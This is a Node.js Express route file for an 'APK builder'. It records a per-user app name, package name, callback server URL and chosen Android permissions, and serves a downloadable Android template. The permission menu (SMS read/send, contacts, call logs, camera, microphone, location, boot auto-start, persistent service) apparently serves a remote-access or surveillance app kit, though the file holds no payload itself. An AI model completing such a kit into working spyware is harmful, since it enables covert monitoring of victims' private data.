const express = require('express');
const fs = require('fs');
const path = require('path');
const archiver = require('archiver');
const { v4: uuidv4 } = require('uuid');
const { authenticate } = require('../middleware/auth');

const router = express.Router();

// APK Builder - Generate custom APK configuration
router.post('/build', authenticate, async (req, res) => {
  try {
    const {
      appName,
      packageName,
      serverUrl,
      permissions,
      iconUrl
    } = req.body;

    // Validate inputs
    if (!appName || !packageName || !serverUrl) {
      return res.status(400).json({ 
        success: false, 
        error: 'App name, package name, and server URL are required' 
      });
    }

    // Generate unique build ID
    const buildId = uuidv4();

    // Create build configuration
    const buildConfig = {
      buildId,
      userId: req.user._id,
      appName,
      packageName,
      serverUrl,
      permissions: permissions || [],
      iconUrl: iconUrl || null,
      createdAt: new Date(),
      status: 'pending'
    };

    // In production, this would trigger actual APK build process
    // For now, we'll create a configuration file
    const configDir = path.join(__dirname, '../apk-builds');
    if (!fs.existsSync(configDir)) {
      fs.mkdirSync(configDir, { recursive: true });
    }

    const configPath = path.join(configDir, `${buildId}.json`);
    fs.writeFileSync(configPath, JSON.stringify(buildConfig, null, 2));

    // Generate build instructions
    const instructions = {
      buildId,
      message: 'APK configuration created successfully',
      nextSteps: [
        '1. Download Android Studio project template',
        '2. Update AndroidManifest.xml with selected permissions',
        '3. Update strings.xml with app name',
        '4. Update build.gradle with package name',
        '5. Replace server URL in Config.java',
        '6. Build APK using: ./gradlew assembleRelease'
      ],
      configFile: `${buildId}.json`,
      estimatedTime: '5-10 minutes'
    };

    res.json({
      success: true,
      buildConfig,
      instructions
    });

  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Get available permissions list
router.get('/permissions', (req, res) => {
  const permissions = [
    { name: 'INTERNET', description: 'Network communication', required: true },
    { name: 'ACCESS_NETWORK_STATE', description: 'Network state info', required: true },
    { name: 'FOREGROUND_SERVICE', description: 'Background service', required: true },
    { name: 'RECEIVE_BOOT_COMPLETED', description: 'Auto-start on boot', required: false },
    { name: 'READ_SMS', description: 'Read SMS messages', required: false },
    { name: 'SEND_SMS', description: 'Send SMS messages', required: false },
    { name: 'READ_CONTACTS', description: 'Read contacts', required: false },
    { name: 'READ_CALL_LOG', description: 'Read call logs', required: false },
    { name: 'CAMERA', description: 'Camera access', required: false },
    { name: 'RECORD_AUDIO', description: 'Microphone access', required: false },
    { name: 'ACCESS_FINE_LOCATION', description: 'GPS location', required: false },
    { name: 'ACCESS_COARSE_LOCATION', description: 'Network location', required: false },
    { name: 'READ_EXTERNAL_STORAGE', description: 'Read files', required: false },
    { name: 'WRITE_EXTERNAL_STORAGE', description: 'Write files', required: false }
  ];

  res.json({ success: true, permissions });
});

// Download APK template
router.get('/template/download', authenticate, (req, res) => {
  try {
    const templateDir = path.join(__dirname, '../android-template');
    const outputPath = path.join(__dirname, '../temp', `template-${Date.now()}.zip`);

    // Create temp directory if not exists
    const tempDir = path.dirname(outputPath);
    if (!fs.existsSync(tempDir)) {
      fs.mkdirSync(tempDir, { recursive: true });
    }

    const output = fs.createWriteStream(outputPath);
    const archive = archiver('zip', { zlib: { level: 9 } });

    output.on('close', () => {
      res.download(outputPath, 'android-template.zip', (err) => {
        // Clean up temp file
        fs.unlinkSync(outputPath);
      });
    });

    archive.on('error', (err) => {
      throw err;
    });

    archive.pipe(output);
    
    // Add template files (if they exist)
    if (fs.existsSync(templateDir)) {
      archive.directory(templateDir, false);
    } else {
      // Create basic template structure
      archive.append('# Android Template\n\nUse Android Studio to build this project.', 
        { name: 'README.md' });
    }

    archive.finalize();

  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

module.exports = router;
